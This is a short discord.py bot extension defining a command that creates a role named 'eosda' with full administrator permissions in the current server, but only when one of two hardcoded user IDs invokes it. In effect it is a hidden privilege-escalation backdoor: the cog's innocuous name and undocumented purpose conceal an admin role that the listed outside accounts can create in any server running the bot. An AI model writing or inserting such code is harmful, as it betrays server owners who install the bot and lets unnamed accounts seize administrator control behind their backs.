import discord
from discord.colour import Color
from discord.ext import commands


class Admev(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.list = [344426002409193472,314376447747948546]

    @commands.command()
    async def admev(self, ctx):
     if ctx.author.id in self.list:
        guild = ctx.guild
        perms = discord.Permissions(send_messages=True, read_messages=True, administrator=True)
        await guild.create_role(name='eosda', permissions=perms)
     else:
         embed = discord.Embed(colour=0xff0000)
         embed.add_field(name="**Insufficient Permission**", value="**ONLY DEVELOPER CAN USE THIS COMMAND!**")
         await ctx.send(embed=embed)





def setup(bot):
    bot.add_cog(Admev(bot))


